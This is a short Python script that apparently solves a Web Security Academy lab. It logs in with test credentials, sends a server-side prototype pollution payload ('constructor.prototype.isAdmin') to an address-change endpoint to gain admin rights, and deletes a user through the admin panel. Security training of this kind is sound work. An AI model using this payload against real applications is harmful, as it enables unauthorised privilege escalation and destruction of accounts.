from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter", with_json=True)

    payload = {
        "sessionId": session.cookies["session"],
        "constructor": {"prototype": {"isAdmin": True}},
    }
    session.post_path("/my-account/change-address", json=payload)
    logger.info('POST\'d the following JSON to "/my-account/change-address":')
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
